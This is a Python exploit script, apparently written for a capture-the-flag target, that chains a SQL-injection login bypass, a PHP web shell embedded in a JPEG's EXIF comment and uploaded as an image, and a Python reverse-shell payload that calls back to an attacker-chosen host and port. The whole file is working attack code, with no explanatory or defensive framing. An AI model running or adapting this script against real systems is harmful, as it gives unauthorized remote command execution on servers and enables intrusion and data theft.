import sys
import requests
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login_sqli(s, ip):
    url = 'http://%s/login.php' % (ip)
    data = {"username": "admin' or '1'='1", "password": "test"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Select Image to Upload" in res:
        print("[+]Login Worked")
    else:
        print("[-] Didn't Work try again")
        sys.exit(-1)


def download_file(s, ip):
    cmd_one = "wget http://%s/images/fulls/5.jpeg" % (ip)
    os.system(cmd_one)
    cmd_two = "exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' 5.jpeg"
    os.system(cmd_two)
    cmd_three = "cp 5.jpeg shell.php.jpeg"
    os.system(cmd_three)


def file_upload(s, ip):
    upload_url = "http://%s/upload.php" % (ip)
    malicious_file = open("shell.php.jpeg", "rb")
    files = {
        "image": malicious_file,
        "submit": (None, 'Upload Image')
        }

    r = s.post(upload_url, files=files, verify=False, proxies=proxies)
    res = r.text
    if "has been uploaded" in res:
        print("[+] The File Has Been Uploaded")
    else:
        print("[-] Did not work try again.")
        sys.exit(-1)

def reverse_shell(s, ip, LHOST, LPORT):
    photo_url = "http://%s/images/uploads/shell.php.jpeg?cmd=" % (ip)
    payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (LHOST, LPORT)
    full_url = photo_url + payload
    print("[+] Do not forget to start the listener....")
    r = s.get(full_url, verify=False, proxies=proxies)


def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target ip> <LHOST> <LPORT> " % sys.argv[0])
        print('(+) eg: %s 10.10.10.185 10.10.15.2 9000 ' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    ip = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv [3]
    

    login_sqli(s, ip)
    download_file(s, ip)
    file_upload(s, ip)
    reverse_shell(s, ip, LHOST, LPORT)



if __name__ == "__main__":
    main()